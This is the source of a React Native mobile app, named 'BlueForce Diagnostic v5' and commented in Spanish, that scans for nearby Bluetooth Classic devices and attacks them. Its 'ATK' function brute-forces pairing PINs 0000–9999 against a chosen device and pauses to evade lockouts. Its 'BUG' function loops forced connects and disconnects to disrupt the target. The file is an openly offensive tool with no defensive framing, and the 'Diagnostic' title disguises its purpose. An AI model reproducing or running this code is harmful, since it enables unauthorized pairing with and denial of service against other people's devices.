import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert, PermissionsAndroid, Platform, FlatList, ActivityIndicator } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [activeTarget, setActiveTarget] = useState(null);
  const [mode, setMode] = useState('IDLE');
  const [currentPin, setCurrentPin] = useState('READY');
  const [logs, setLogs] = useState([]);
  const [isScanning, setIsScanning] = useState(false);

  const addLog = (msg) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 100));

  // PETICIÓN DE PERMISOS MAESTRA
  const requestPermissions = async () => {
    if (Platform.OS !== 'android') return true;
    try {
      addLog("🕵️ Verificando seguridad de Android...");
      const granted = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
        PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE,
      ]);
      
      const allGranted = Object.values(granted).every(res => res === PermissionsAndroid.RESULTS.GRANTED);
      if (allGranted) {
        addLog("✅ ACCESO TOTAL CONCEDIDO.");
        return true;
      } else {
        addLog("❌ PERMISOS DENEGADOS por el sistema.");
        Alert.alert("ATENCIÓN", "Debes aceptar TODOS los permisos para que la App pueda transmitir.");
        return false;
      }
    } catch (err) {
      addLog("⚠️ Error en capa de permisos.");
      return false;
    }
  };

  useEffect(() => { requestPermissions(); }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    const ok = await requestPermissions();
    if (!ok) return;

    setIsScanning(true);
    setDiscoveredDevices([]);
    addLog("📡 Iniciando radiofrecuencia...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
      addLog(`🔍 ${devices.length} objetivos en rango.`);
    } catch (e) {
      addLog("❌ ERROR: Radio ocupada o Bluetooth apagado.");
    } finally {
      setIsScanning(false);
    }
  };

  const startBruteForce = async (device) => {
    setActiveTarget(device.address);
    setMode('BRUTE');
    addLog(`🚀 ATAQUE EN CURSO contra ${device.address}`);

    try {
      // LIMPIEZA PREVIA: Detener escaneo para liberar antena
      await RNBluetoothClassic.cancelDiscovery();
      addLog("🧹 Antena liberada para ataque.");

      for (let i = 0; i <= 9999; i++) {
        let m; setMode(c => { m = c; return c; });
        if (m !== 'BRUTE') break;

        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        
        try {
          addLog(`💉 Inyectando PIN: ${pin}`);
          await RNBluetoothClassic.pairDevice(device.address, { pin });
          
          await new Promise(r => setTimeout(r, 1200));
          const bonded = await RNBluetoothClassic.getBondedDevices();
          if (bonded.some(d => d.address === device.address)) {
            addLog("🎯 ÉXITO: Vínculo establecido!");
            setMode('IDLE');
            Alert.alert("CONQUISTADO", `PIN REAL: ${pin}`);
            return;
          }
        } catch (e) {
          // Ignorar errores de "Clave incorrecta" y seguir
          if (i > 0 && i % 10 === 0) {
            addLog("⏲️ Bypass de seguridad parlante...");
            await new Promise(r => setTimeout(r, 3000));
          }
        }
      }
    } catch (err) {
      addLog(`⚠️ FALLO CRÍTICO: ${err.message}`);
    }
    setMode('IDLE');
  };

  const startDisruptor = async (device) => {
    setMode('DISRUPT');
    addLog("🔥 MODO DISRUPTOR: Saturando canal...");
    try {
      await RNBluetoothClassic.cancelDiscovery();
      while (true) {
        let m; setMode(c => { m = c; return c; });
        if (m !== 'DISRUPT') break;
        
        try {
          // ATAQUE DE DESCONEXIÓN FORZADA
          await RNBluetoothClassic.connectDevice(device.address);
          await RNBluetoothClassic.disconnectDevice(device.address);
        } catch (e) {}
      }
    } catch (e) {}
    setMode('IDLE');
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Diagnostic v5</Text>
      <View style={styles.panel}>
        <Text style={styles.label}>ESTADO: {mode}</Text>
        <Text style={styles.pin}>{currentPin}</Text>
        <TouchableOpacity style={styles.scanBtn} onPress={scan}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.stext}>INICIAR BARRIDO</Text>}
        </TouchableOpacity>
      </View>
      <FlatList data={discoveredDevices} keyExtractor={i => i.address} renderItem={({ item }) => (
        <View style={styles.card}>
          <View style={{ flex: 1 }}>
            <Text style={styles.name}>{item.name || "N/A"}</Text>
            <Text style={styles.mac}>{item.address} | {item.rssi} dBm</Text>
          </View>
          <View style={{ flexDirection: 'row' }}>
            <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
              <Text style={styles.bt}>ATK</Text>
            </TouchableOpacity>
            <TouchableOpacity style={[styles.btn, {backgroundColor:'#ff0044', marginLeft: 5}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}>
              <Text style={styles.bt}>BUG</Text>
            </TouchableOpacity>
          </View>
        </View>
      )} />
      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={() => setMode('IDLE')}><Text style={styles.bt}>DETENER</Text></TouchableOpacity>}
      <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.lt}>{l}</Text>)}</ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  title: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20 },
  label: { color: '#555', fontSize: 10, textAlign: 'center' },
  pin: { color: '#fff', fontSize: 40, fontWeight: 'bold', textAlign: 'center' },
  scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center', marginTop: 15 },
  stext: { fontWeight: 'bold' },
  card: { backgroundColor: '#181818', padding: 15, borderRadius: 10, marginBottom: 8, flexDirection: 'row', alignItems: 'center' },
  name: { color: '#fff', fontWeight: 'bold', fontSize: 12 },
  mac: { color: '#666', fontSize: 9 },
  btn: { backgroundColor: '#333', padding: 12, borderRadius: 8 },
  bt: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  stop: { backgroundColor: '#ff0044', padding: 15, borderRadius: 12, alignItems: 'center', marginBottom: 10 },
  logs: { height: 120, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
  lt: { color: '#333', fontSize: 8, marginBottom: 2 }
});
